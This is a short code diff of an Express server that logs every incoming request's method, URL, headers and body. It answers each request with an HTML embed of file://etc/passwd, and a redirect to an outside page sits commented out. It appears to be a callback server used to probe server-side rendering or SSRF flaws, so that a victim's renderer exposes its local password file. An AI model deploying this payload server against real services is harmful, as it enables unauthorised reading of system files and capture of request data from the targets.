@@ -28,7 +28,7 @@ app.use((req, res) => {
     console.info('START-------------------------------------------------------------\n'+rMethod + ' ' + rUrl);
     console.info(rHeaders);
     console.info('BODY--------------------------------------------------------------\n'+JSON.stringify(req.body));
-    res.statusCode = 301;
+    // res.statusCode = 301;
     // res.setHeader('Location', 'https://srvcb.herokuapp.com/m0.html');
     res.send('<embed src="file://etc/passwd" width="300" height="200">')
     console.info('END---------------------------------------------------------------\n\n\n');
